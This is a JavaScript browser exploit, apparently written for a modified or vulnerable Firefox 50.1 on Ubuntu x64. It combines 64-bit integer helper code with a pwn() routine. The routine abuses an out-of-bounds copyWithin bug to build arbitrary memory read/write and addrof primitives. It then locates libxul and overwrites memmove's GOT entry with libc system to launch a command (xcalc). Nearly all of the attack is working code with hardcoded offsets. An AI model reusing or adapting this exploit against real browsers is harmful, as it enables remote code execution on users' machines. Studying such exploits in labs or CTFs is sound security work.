//
// Mostly saelo's int64.js and util.js functions
// 

function sleep(miliseconds) {
    var currentTime = new Date().getTime();
    
    while (currentTime + miliseconds >= new Date().getTime()) {
    }
}

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

function print(msg) {
    console.log(msg);
    document.body.innerText += msg + '\n';
}

//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this == other
    this.equals = operation(function(other) {
        for (var i = 0; i < 8; i++) {
            if (this.byteAt(i) != other.byteAt(i))
                return false;
        }
        return true;
    }, 1);

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a << 1
    this.assignLShift1 = operation(function lshift1(a) {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i);
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
        return this;
    }, 1);

    // this = a >> 1
    this.assignRShift1 = operation(function rshift1(a) {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = a.byteAt(i);
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
        return this;
    }, 1);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromJSValue = function(bytes) {
    bytes[7] = 0;
    bytes[6] = 0;
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return ~n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

function LShift1(a) {
    return (new Int64()).assignLShift1(a);
}

function RShift1(a) {
    return (new Int64()).assignRShift1(a);
}

function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function Equals(a, b) {
    return a.equals(b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);



function pwn () {
    var arrs = [];
    arrs.push(0x41414141)
    for (var i=0; i < 100; i++) {
        arrs.push(new ArrayBuffer(0x60));
    }

    // arrs in memory (see js/vm/NativeObject.h)
    /*
     *                    group_                    shape_
     * 0x7ffff7e86190: 0x00007ffff7e82820      0x00007ffff7e96dd0
     *                      slots_                  elements_
     * 0x7ffff7e861a0: 0x0000000000000000      0x00007ffff68c6410
     * 
     *                  flags           initlen         capacity         length
     * 0x7ffff68c6400: 0x00000000      0x00000065      0x0000007e      0x00000065
     * 0x7ffff68c6410: 0x41414141      0xfff88000      0xf7e85100      0xfffe7fff
     * 
     * 0x7ffff68c6410: 0xfff8800041414141      0xfffe7ffff7e85100
     * 0x7ffff68c6420: 0xfffe7ffff7e851a0      0xfffe7ffff7e85240
     * 
     * arrs[1]: ArrayBufferObject:
     *                     group_                   shape_
     * 0x7ffff7e85100: 0x00007ffff7e828b0      0x00007ffff7ea92e0
     *                     slots_                   elements (<emptyElementsHeaderShared>)
     * 0x7ffff7e85110: 0x0000000000000000      0x0000555556623060
     * 
     *                      DATA_SLOT             BYTE_LENGTH
     * 0x7ffff7e85120: 0x00003ffffbf428a0      0xfff8800000000060
     *                      FIRST_VIEW              FLAGS
     * 0x7ffff7e85130: 0xfffc000000000000      0xfff8800000000000
     *
     */

    // The DATA_SLOT is stored as (val >> 1)
    // 0x00003ffffbf428a0 << 1 = 0x7ffff7e85140
    // See js/public/Value.h:
    /*
     *
     * static inline jsval_layout
     * PRIVATE_PTR_TO_JSVAL_IMPL(void* ptr)
     * {
     *     jsval_layout l;
     *     uintptr_t ptrBits = uintptr_t(ptr);
     *     MOZ_ASSERT((ptrBits & 1) == 0);
     *     l.asBits = ptrBits >> 1;
     *     MOZ_ASSERT(JSVAL_IS_DOUBLE_IMPL(l));
     *     return l;
     * }
     * 
     * static inline void*
     * JSVAL_TO_PRIVATE_PTR_IMPL(jsval_layout l)
     * {
     *     MOZ_ASSERT((l.asBits & 0x8000000000000000LL) == 0);
     *     return (void*)(l.asBits << 1);
     * } 
     */


    // Trigger vuln to leak next ArrayBuffer.data pointer with out of bounds read
    var view = new Uint8Array(arrs[1]);
    var hax = { valueOf : function() {view.offset = 88; return 0}};

    // offfset = (length - offset) + DATA_SLOT
    // offset = 0x60 - 88) + 0x20 = 0x28
    view.copyWithin(hax, 0x28, 0x28+8);
    var ptr = LShift1(new Int64(view));
    print("arrs[2].data = " + ptr);

    // addr of view is: ptr - offset(data) - length - "sizeof(ArrayBuffer)"
    // addr of view is: ptr - 0x40 - 0x60 - 0x40
    var view_addr = Sub(ptr, 0x40+0x60+0x40);
    print("addrof(view) = " + view_addr);

    // Trigger vuln again to overwrite next ArrayBuffer.data pointer with out of bounds write
    view.set(RShift1(view_addr).bytes());
    view.offset = 0;
    view.copyWithin(0x28, hax, 8);

    var inner = arrs[1];
    var outer = new Uint8Array(arrs[2]);


    // fetch a known value to check that it worked:
    var inner_size = outer.slice(0x28, 0x29)[0];
    if (inner_size != 0x60) {
        print("Failed: Couldn't setup read/write primitive");    
        return;
    }
    
    // create memory object for arbitrary read and write
    var memory = {
        read: function (addr, length) {
            // inner.data = outer + 0x20
            outer.set(RShift1(addr).bytes(), 0x20);
            var innerView = new Uint8Array(inner);
            return innerView.slice(0, length);
        },
        read64: function (addr) {
            return new Int64(this.read(addr, 8));
        },
        write: function (addr, data) {
            // inner.data = outer + 0x20
            outer.set(RShift1(addr).bytes(), 0x20);
            var innerView = new Uint8Array(inner);
            innerView.set(data.bytes());
        },
        addrof: function (obj) {
            inner.leak = obj;
            var slots_addr = Add(view_addr, 0x10);
            var slots = this.read64(slots_addr);
            print("Slots_addr: " + slots_addr);
            print("Slots: " + slots);
            return Int64.fromJSValue(this.read(slots, 8));
        }
    }
    

    /*
     * get code execution by overwriting libxul's got.
     * you have to adjust those values to your particular libc and libxul.
     * From now on you'll need to execute the actual firefox-bin.
     */
    

    // 18292bd12d37bfaf58e8dded9db7f1f5da1192cb  /lib/x86_64-linux-gnu/libc-2.27.so 
    var systemToSscanf = 0x7b110 - 0x4f440;
    // Firefox 50.1 Ubuntu x64
    //    readelf --relocs libxul.so | grep memmove
    var memmoveOffset = 0x00000a8301a0;
    //    readelf --relocs libxul.so | grep sscanf
    var sscanfOffset = 0x00000a830220;
    // this one is a nasty one to find, my approach was dynamically after leaking the absolute address
    //var maxFuncOffset = 0x74df98f;
    var maxFuncOffset = 0x7400000;
    
    // libxul is the main library for firefox and contains the buildin functions as for example Math.<func>
    var max_obj = memory.addrof(Math.max); // Checking this object dynamically reveiled a code pointer into libxul at offset 0x28:
    var max_addr = memory.read64(Add(max_obj, 0x28));
    
    // let's search for libxul start
    print("Math.max @ " + max_addr);
    var elf_magic = new Int64(0x00010102464c457f)
    var done = false;
    var current = And(Sub(max_addr, maxFuncOffset), 0xfffffffffffff000);
    while (!done) {
        var val = memory.read64(current);
        if (Equals(val, elf_magic)) {
            done = true;
            break;
        }
        current = Sub(current, 0x1000);
    }
    if (!done) {
        print("Failed; Couldn't find libxul-base");
        return;
    }
    var libxul_base = current;
    print("libxul @ " + libxul_base);
    
    memmove_got = Add(libxul_base, memmoveOffset);
    print("got: " + memmove_got);
    memmove_libc = memory.read64(memmove_got);
    print("memmove @ " + memmove_libc);
    
    sscanf_libc = memory.read64(Add(libxul_base, sscanfOffset));
    print("sscanf @ " + sscanf_libc);
    
    system_libc = Sub(sscanf_libc, systemToSscanf);
    print("system @ " + system_libc);
    

    target = new Uint8Array(40);
    cmd = "/usr/bin/xcalc";
    for (var i = 0; i < cmd.length; i++) {
        target[i] = cmd.charCodeAt(i);
    }
    memory.write(memmove_got, system_libc);
    target.copyWithin(0, 1)
    memory.write(memmove_got, system_libc);
}

pwn();
